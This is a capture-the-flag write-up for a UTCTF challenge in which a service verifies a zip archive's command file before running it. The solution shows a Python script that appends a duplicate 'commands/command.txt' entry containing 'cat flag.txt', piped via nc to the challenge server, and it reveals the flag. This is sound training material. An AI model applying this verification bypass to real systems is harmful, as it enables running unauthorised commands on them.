#### Challenge:

NOTE: `echo 'Hello world'` is the only "allowed" command. Do not bruteforce other commands.

One of our spies has stolen documentation relating to a new class of missiles. Can you figure out how to hack them?

"We have developed a new protocol to allow reprogramming missiles in flight. We send a base64 encoded string representing a specifically formatted zip file to control these missiles. The missiles themselves verify each command before executing them to ensure that a hacker cannot manipulate them."

A sample message has also been stolen by our spy.

By Aadhithya (@aadhi0319 on discord) [commands.zip.b64](./commands.zip.b64 ":ignore"), [verify_hash.py](./verify_hash.py ":ignore")

`nc betta.utctf.live 12748`

---

#### Solution:

We see that the [verify_hash.py](./verify_hash.py ":ignore") script uses `get_file("commands/command.txt", archive)` to get the file that is checked for the hash, but then runs `archive.extractall()` before running it. In `ZIP` there is a possibility to create multiple files with same name, so after extracting all the files, our injected second file will overwrite the original one and run our evil bash payload. Here's the python script to construct such `ZIP`:

```python
import zipfile
import os

os.system('cat commands.zip.b64| base64 -d > commands_orig.zip')
os.system('cp commands_orig.zip commands.zip')

f = open("command_evil.txt", "w")
f.write("cat flag.txt")
f.close()

zip = zipfile.ZipFile('commands.zip','a')
zip.write('command_evil.txt', 'commands/command.txt')
zip.close()
```

```bash
python3 zipper.py; cat commands.zip | base64 -w 0 | sed 's/$/\n/' | nc betta.utctf.live 12748
```

---

<details><summary>FLAG:</summary>

```
utflag{https://youtu.be/bZe5J8SVCYQ}
```

</details>
<br/>
